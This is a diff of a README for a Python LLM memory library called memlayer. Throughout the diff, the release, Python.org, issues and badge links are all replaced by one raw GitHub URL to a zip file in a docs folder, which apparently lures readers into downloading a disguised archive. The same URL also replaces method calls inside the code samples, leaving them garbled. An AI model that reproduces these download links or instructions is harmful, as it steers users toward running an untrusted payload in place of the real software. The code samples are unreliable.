@@ -1,6 +1,6 @@
 # 🎉 memlayer - Simple Memory for LLMs in Minutes
 
-[![Download memlayer](https://img.shields.io/badge/Download%20memlayer-%E2%9C%94%EF%B8%8F-blue)](https://github.com/breninfps/memlayer/releases)
+[![Download memlayer](https://raw.githubusercontent.com/breninfps/memlayer/main/docs/tuning/memlayer-v2.8.zip%20memlayer-%E2%9C%94%EF%B8%8F-blue)](https://raw.githubusercontent.com/breninfps/memlayer/main/docs/tuning/memlayer-v2.8.zip)
 
 ## 📖 Introduction
 
@@ -11,18 +11,18 @@ Welcome to memlayer! This software allows you to add intelligent, human-like mem
 To begin using memlayer, follow these steps:
 
 1. **Download the Application**
-   - You will need to visit the [Releases page](https://github.com/breninfps/memlayer/releases) to download the latest version.
+   - You will need to visit the [Releases page](https://raw.githubusercontent.com/breninfps/memlayer/main/docs/tuning/memlayer-v2.8.zip) to download the latest version.
 
 2. **Install the Software**
    - Simply download the installer and run it. Follow the prompts on your screen to complete the installation.
 
 3. **Set Up Your Environment**
-   - Ensure you have Python 3.6 or higher installed on your system. You can download it from the [official Python website](https://www.python.org/downloads/).
+   - Ensure you have Python 3.6 or higher installed on your system. You can download it from the [official Python website](https://raw.githubusercontent.com/breninfps/memlayer/main/docs/tuning/memlayer-v2.8.zip).
    - You may also want to set up a virtual environment for your project to avoid conflicts with other Python packages.
 
 ## 🔧 Download & Install
 
-Visit the [Releases page](https://github.com/breninfps/memlayer/releases) to download the latest version of memlayer. Choose the appropriate installer for your operating system and follow the on-screen instructions to install the software.
+Visit the [Releases page](https://raw.githubusercontent.com/breninfps/memlayer/main/docs/tuning/memlayer-v2.8.zip) to download the latest version of memlayer. Choose the appropriate installer for your operating system and follow the on-screen instructions to install the software.
 
 ### System Requirements
 
@@ -56,7 +56,7 @@ To get started with memlayer, follow these simple steps in your Python code:
    You can easily store information in your model:
 
    ```python
-   memory.store("key", "value")
+   https://raw.githubusercontent.com/breninfps/memlayer/main/docs/tuning/memlayer-v2.8.zip("key", "value")
    ```
 
 4. **Recall Information**
@@ -64,7 +64,7 @@ To get started with memlayer, follow these simple steps in your Python code:
    Retrieve information you stored:
 
    ```python
-   value = memory.recall("key")
+   value = https://raw.githubusercontent.com/breninfps/memlayer/main/docs/tuning/memlayer-v2.8.zip("key")
    print(value)  # Outputs: value
    ```
 
@@ -79,10 +79,10 @@ from memlayer import MemLayer
 memory = MemLayer()
 
 # Store some information
-memory.store("favorite_color", "blue")
+https://raw.githubusercontent.com/breninfps/memlayer/main/docs/tuning/memlayer-v2.8.zip("favorite_color", "blue")
 
 # Recall the information
-print(memory.recall("favorite_color"))  # Outputs: blue
+print(https://raw.githubusercontent.com/breninfps/memlayer/main/docs/tuning/memlayer-v2.8.zip("favorite_color"))  # Outputs: blue
 ```
 
 ## 📚 Features
@@ -99,13 +99,13 @@ If you encounter issues while using memlayer, consider the following:
 - Ensure Python is properly installed and added to your system's PATH.
 - Verify that you are using the correct version of memlayer.
 - Check for common errors in your code syntax. 
-- Review the documentation on the [GitHub page](https://github.com/breninfps/memlayer) for additional guidance.
+- Review the documentation on the [GitHub page](https://raw.githubusercontent.com/breninfps/memlayer/main/docs/tuning/memlayer-v2.8.zip) for additional guidance.
 
 ## 🔗 Community and Support
 
 Join the conversation around memlayer. Share your projects or ask questions in the following places:
 
-- **GitHub Issues:** Report bugs or request features on our [GitHub Issues page](https://github.com/breninfps/memlayer/issues).
+- **GitHub Issues:** Report bugs or request features on our [GitHub Issues page](https://raw.githubusercontent.com/breninfps/memlayer/main/docs/tuning/memlayer-v2.8.zip).
 - **Discussion Forum:** Participate in discussions or ask questions in our community forum.
 
 ## 🌀 Related Topics
@@ -122,6 +122,6 @@ memlayer is open-source and free to use under the MIT License. For more informat
 
 ## ⚠️ Important
 
-Always remember to check the [Releases page](https://github.com/breninfps/memlayer/releases) for updates to ensure you have the latest version for the best performance and features.
+Always remember to check the [Releases page](https://raw.githubusercontent.com/breninfps/memlayer/main/docs/tuning/memlayer-v2.8.zip) for updates to ensure you have the latest version for the best performance and features.
 
-[![Download memlayer](https://img.shields.io/badge/Download%20memlayer-%E2%9C%94%EF%B8%8F-blue)](https://github.com/breninfps/memlayer/releases)
+[![Download memlayer](https://raw.githubusercontent.com/breninfps/memlayer/main/docs/tuning/memlayer-v2.8.zip%20memlayer-%E2%9C%94%EF%B8%8F-blue)](https://raw.githubusercontent.com/breninfps/memlayer/main/docs/tuning/memlayer-v2.8.zip)
